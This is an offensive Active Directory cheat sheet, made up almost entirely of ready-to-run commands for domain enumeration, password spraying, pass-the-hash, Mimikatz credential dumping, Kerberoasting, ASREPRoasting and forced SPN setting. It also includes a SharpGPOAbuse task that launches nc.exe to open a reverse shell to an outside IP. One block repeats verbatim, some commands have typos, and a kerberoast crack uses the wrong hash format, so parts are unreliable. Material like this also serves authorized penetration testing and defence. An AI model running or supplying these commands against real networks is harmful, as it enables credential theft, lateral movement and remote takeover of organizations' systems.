# Active Directory
======
#### Dump Domain (ldapdomaindump)
ldapdomaindump ldap://<domain> -u 'DOMAIN\user' -p 'password'
#### Dump Users (nmap)
nmap -p 389 --script-args 'ldap.username="cn=myUser,cn=users,dc=myDomain,dc=local",ldap.password=P@ssw0rd,ldap.qfilter=users,ldap.attrip=sAMAccountName' myDomain.local
#### Return list of users
cat domain_users.grep | awk '{print $1}' > users.txt
#### Return list of computers + IPs
cat domain_computers.grep | awk '{print $3}' | grep -v dNS | xargs dig a @192.168.105.10 | grep kortana.local | egrep -v "^;" | awk '{print $5"-"$1}' | cut -d '.' -f1-4 | tr [[:lower:]] [[:upper:]]
#### mkdir in a loop
for dir in $(cat domain_computers.grep | awk '{print $3}' | grep -v dNS | xargs dig a @192.168.105.10 | grep kortana.local | egrep -v "^;" | awk '{print $5"-"$1}' | cut -d '.' -f1-4 | tr [[:lower:]] [[:upper:]]); do mkdir ~/$dir; done

## Password Spraying
------
#### Password Spraying (CrackMapExec)
crackmapexec smb -u /path/to/users.txt -p /path/to/passwords.txt 192.168.0.0/24
#### Spray with Local Administrator Password
crackmapexec smb 192.168.0.0/24 -u Administrator --local-auth -H <NTLM:hash>
#### Remote Desktop
xfreerdp /u:DOMAIN\user /p:<pass> /v:<ip>
#### Rubeus (get TGT and apply to new process)
Rubeus.exe asktgt /user:<user> /rc4:<NTLM hash> /createnetonly:cmd.exe /show /domain:<domain> /dc:<dc-ip>
#### Mimikatz programmatically dump passwords
mimikatz.exe "privilege::debug" "log .\logs\Result.txt" "sekurlsa::logonPasswords" "token::elevate" "lsadump::sam" exit
#### Create Immediate GPO Task
SharpGPOAbuse.exe --AddComputerTask --TaskName "New Task" --Author "DOMAIN\user" --Command "cmd.exe" --Arguments "/c C:\Temp\nc.exe -v 192.168.99.21 443 -e cmd"  --GPOName Name-of-GPO
#### Local Administrator Password
crackmapexec smb 192.168.0.0/24 -u Administrator --local-auth -H <NTLM:hash>
#### Remote Desktop
xfreerdp /u:DOMAIN\user /p:<pass> /v:<ip>
#### Rubeus (get TGT and apply to new process)
Rubeus.exe asktgt /user:<user> /rc4:<NTLM hash> /createnetonly:cmd.exe /show /domain:<domain> /dc:<dc-ip>
#### Mimikatz programmatically dump passwords
mimikatz.exe "privilege::debug" "log .\logs\Result.txt" "sekurlsa::logonPasswords" "token::elevate" "lsadump::sam" exit

## Kerberoast
------
#### Find Service Accounts (PowerView)
Get-NetUser -SPN
#### Find Service Accounts (PowerShell)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
#### Find Service Accounts (Impacket)
python GetUserSPNs.py domain.local/domainUser:abc123 -outputfile outfile.txt
#### Do Kerberoasting (PowerView)
Invoke-Kerberoast -Domain plum.local
#### Crack Kerberoast Hash
john kerberoast.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep

## ASREPRoast
------
#### ASREPRoast (PowerView)
Get-DomainUser -PreauthNotRequired -Verbose
#### ASREPRoast (PowerShell)
Get-ADUser -Filter {DoesNoteRequirePreAuth -eq $True} -Properties DoesNoteRequirePreAuth
#### Do ASREPRoasting, targeted user
Get-ASREPHash -UserName myUser -Verbose
#### Do ASREPRoasting, all users
Invoke-ASREPRoast -Verbose
#### Do ASREPRoasting (Rubeus)
.\Rubeus.exe asreproast /outfile:outfile.txt
#### Do ASREPRoasting (Impacket)
python GetNPUsers.py domain.local/ -usersfile users.txt -outputfile outfile.txt

## Force Set SPN (in order to kerberoast an account!)
------
#### Set SPN on Account (PowerView)
Set-DomainObject myUSer -Set @{serviceprincipalname='ops/whatever1'}
#### Set SPN on Account (PowerShell)
Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}
